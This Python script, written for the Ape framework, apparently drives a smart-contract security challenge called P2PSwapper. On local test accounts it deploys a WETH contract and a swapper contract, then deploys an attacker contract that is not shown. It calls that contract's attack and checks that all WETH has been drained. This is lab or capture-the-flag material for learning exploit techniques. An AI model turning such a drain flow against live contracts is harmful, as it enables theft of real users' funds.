from ape import accounts, project
from .utils.helper import MAX_UINT256, w3


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy P2P WETH and Challenge contract
    print("\n--- Deploying P2P WETH and Challenge contracts ---\n")
    weth = project.P2P_WETH.deploy(sender=deployer)
    challenge = project.P2PSwapper.deploy(weth.address, sender=deployer)

    weth.deposit(value=w3.to_wei(1, "ether"), sender=deployer)
    weth.approve(challenge.address, MAX_UINT256, sender=deployer)

    challenge.createDeal(
        weth.address,
        10000000,
        weth.address,
        10000000,
        value=2_000_000,
        sender=deployer,
    )

    # define initial balances for challenge
    challenge_initial_bal = weth.balanceOf(challenge.address)

    print(f"\n--- \nInitial Balances:\n⇒ Challenge: {challenge_initial_bal}\n---\n")

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.P2PSwapperAttacker.deploy(
        challenge.address,
        value=w3.to_wei(2, "ether"),
        sender=attacker,
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print(
        "\n--- After exploit: Attacker drained all WETH from Challenge Contract ---\n"
    )

    # define ending balances for challenge
    challenge_final_bal = weth.balanceOf(challenge.address)

    print(f"\n--- \nFinal Balances:\n⇒ Challenge: {challenge_final_bal}\n---\n")

    assert weth.balanceOf(challenge.address) == 0

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
